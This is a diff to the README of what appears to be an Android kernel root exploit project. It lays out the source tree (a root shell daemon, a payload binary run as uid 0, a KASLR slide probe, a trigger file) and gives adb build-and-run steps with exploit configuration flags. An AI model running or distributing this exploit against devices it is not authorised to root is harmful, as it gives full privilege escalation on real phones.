@@ -50,34 +50,42 @@ Full detail: `docs/KSU_ROOT_FINDINGS.md` (sections 1-13 — the main findings, E
 
 ```
 README.md
+REPRODUCE.md            # build + run from source (start here)
 LICENSE                 # GPL-2.0
 docs/                   # English technical docs (findings, flow, run config)
 src/                    # exploit source
   core/                 # route + payload builders (single timing-critical process)
-  primitives/           # rootshell.c (root shell daemon), mpnl.c + webui.html (root UI)
-  payload/              # dnroot.c -> the separate `dnroot` UMH payload binary
-  tools/                # glshell.c -> in-process debug shell over the live gadget
+  primitives/           # rootshell.c, mphelper.c, mpnl.c + webui.html (root daemon + UI)
+  payload/              # dnroot.c -> the `dnroot` UMH payload binary
+  tools/                # glshell.c (debug shell), slideprobe.c, trigger.c, getid.c, rsd.c
   devices/beyond0q/     # this device line (offsets.h)
 refs/rom-4.14/          # ROM kernel source subset (reference)
+scripts/                # host/device helpers (arm_root.sh, ui_selftest.sh, runroot.sh, ...)
 tools/
-  build14.sh            # build (WSL) -> *_a64 (driver) + *_dnroot_a64 (payload)
+  build14.sh            # build ALL artifacts (WSL/arm64 host) -> *_a64 + *_pwn2
 ```
 
 ## Build & run (WSL)
 
+Full from-source walkthrough: **`REPRODUCE.md`**. Short version:
+
 ```
-# build -> glXX_a64 (driver) + glXX_dnroot_a64 (UMH payload)
+# 1. build every artifact -> <base>_a64 (+ <base>_pwn2)
 bash tools/build14.sh /tmp/glXX
-adb push glXX_a64 /data/local/tmp/glXX
-adb push glXX_dnroot_a64 /data/local/tmp/dnroot      # UMH payload (exec'd as uid 0)
-adb shell "chmod 755 /data/local/tmp/glXX /data/local/tmp/dnroot"
-# KASLR slide
-adb shell "cd /data/local/tmp && timeout 60 ./slideprobe > sp.log 2>&1; grep -a -m1 bd4 sp.log"
-# redirect phase (safe stop)
-adb shell "cd /data/local/tmp && ONLY_FOPS=1 CFI_STOP_VERIFY=1 SSOPT_EMPTY=1 SSOPT_FAKE_TASK=1 \
-  SSOPT_PEEK=1 SSOPT_HOLD=0 SSOPT_OWNER0=0 PSELECT_ROUTE_DELAY_USEC=0 ROUTE_SETSOCKOPT=1 \
-  SLIDE=0x... timeout 120 ./glXX"
+#    driver        = glXX_a64
+#    daemon + UI   = glXX_mpnl_a64      (push to /data/local/tmp/mpnl)
+#    UMH payload   = glXX_dnroot_a64
+#    slide probe   = glXX_slideprobe_a64
+#    trigger file  = glXX_pwn2
+
+# 2. arm per boot (slide probe -> driver -> trigger -> verify)
+ADB=adb DRIVER=/data/local/tmp/glXX MPNL=/data/local/tmp/mpnl \
+  bash scripts/arm_root.sh
 ```
+
+Then open `http://127.0.0.1:8080/` in Chrome **on the device**. The precise,
+one-command-per-step procedure and the working flag set are in
+`docs/DEBUG_WORKFLOW.md` and `docs/RUN_CONFIG.md`.
 
 ## Notes
 
